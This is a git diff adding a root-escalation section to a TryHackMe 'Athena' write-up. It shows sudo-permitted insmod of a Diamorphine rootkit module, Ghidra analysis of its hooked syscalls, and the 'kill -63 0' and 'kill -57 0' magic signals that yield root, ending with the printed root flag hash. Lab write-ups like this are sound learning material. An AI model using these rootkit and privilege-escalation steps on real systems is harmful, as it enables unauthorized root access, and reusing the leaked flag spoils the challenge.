@@ -1,4 +1,4 @@
-# Link
+<img width="411" height="46" alt="Screenshot 2026-02-24 201025" src="https://github.com/user-attachments/assets/647c350e-8b23-4c58-9529-787bcd1568d7" /># Link
 [Athena](https://tryhackme.com/room/4th3n4)
 
 # Reconnaisance
@@ -155,3 +155,87 @@ cat user.txt
 ```
 
 Got the first flag
+# Root Privilege Escalation
+By checking `sudo -l`
+```
+Matching Defaults entries for athena on routerpanel:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User athena may run the following commands on routerpanel:
+    (root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko
+```
+Use `athena` can execute `insmod`,  is a Linux command used to insert a loadable kernel module (LKM) into the running kernel.
+At this stage, the tags give me hint to perform reverse engineering for the `venom.ko`
+
+On target machine
+```
+cd /mnt/.../secret
+python3 -m http.server 1111
+```
+Checking type of that file
+```
+$ file venom.ko                                                                               
+venom.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=eebba7df9eb49a3710bee654df1171c38703cce2, with debug_info, not stripped
+```
+
+Then start running `Ghidra`, in the init decompiler, I found this
+<img width="322" height="27" alt="Screenshot 2026-02-24 200704" src="https://github.com/user-attachments/assets/8ca7fda6-8465-4ab9-84ad-93b425c011ba" />
+Diamorphine in the context of cybersecurity refers to a Linux kernel rootkit that allows attackers to gain and maintain stealthy, persistent access to compromised systems
+
+While searching for Diamorphine LKM, I end up with this github 
+[https://github.com/m0nad/Diamorphine](https://github.com/m0nad/Diamorphine)
+
+To sum up, this is a rootkit that is not detected after loading. Let's try to figure out what it actually does, from 31 -33
+<img width="411" height="46" alt="Screenshot 2026-02-24 201025" src="https://github.com/user-attachments/assets/769b530a-2639-4044-b1fc-906b584a1031" />
+the original kill, getdent,getdents64 are referenced and stored
+
+from line 35-36, it redirects the address of getdents64 to hacked_getdents, kill to hacked_kill
+<img width="280" height="31" alt="Screenshot 2026-02-24 201039" src="https://github.com/user-attachments/assets/bf549ff2-5afa-4179-8f4c-2bdb96b0ba28" />
+
+Allowing the rootkit to intercept and modify the behaviour of syscall kill
+
+Let's inspect the `hacked_kill` funciton for further knowledge
+The function check the value of `iVar3`
+<img width="187" height="60" alt="Screenshot 2026-02-24 201823" src="https://github.com/user-attachments/assets/817dcf06-ab08-41bd-9af5-57be0f12de8e" />
+
+if the variable `iVar3` = 0x39 then I can get the root privileges escalation, from my basic understanding, if `iVar3` is equal to 0x3f,  it toggles the module's hidden status. This appears to hide or reveal the presence of the rootkit module.
+<img width="487" height="273" alt="Screenshot 2026-02-24 202217" src="https://github.com/user-attachments/assets/952d41b6-408c-4ff0-9085-20afd0954621" />
+
+Now, it's time to load the module
+```
+sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
+lsmod | grep venom
+```
+By using the command `lsmod` to list all current loaded kernel modules, which I expect to view venom but not. Therefore, spending some time doing research I found that I can acutally use kill command with the desired signal number and targeting all processes by specifying 0 as the process group or process ID.
+
+0x39 -> 57
+0x3f -> 63
+
+But first, remember the hidden status in hacked_kill function, well, i need to turn off that first to make the module visible by applying this command
+```
+kill -63 0
+lsmod | grep venom
+venom                  16384  0
+
+```
+
+Then to gain root privilege -> 
+```
+kill -57 0
+id
+uid=0(root) gid=0(root) groups=0(root),1001(athena)
+ls
+fsociety00.dat  root.txt
+cat root.txt
+aecd4a3497cd2ec4bc71a2315030bd48
+
+```
+
+Happy Hacking !!!
+
+
+
+
+
+
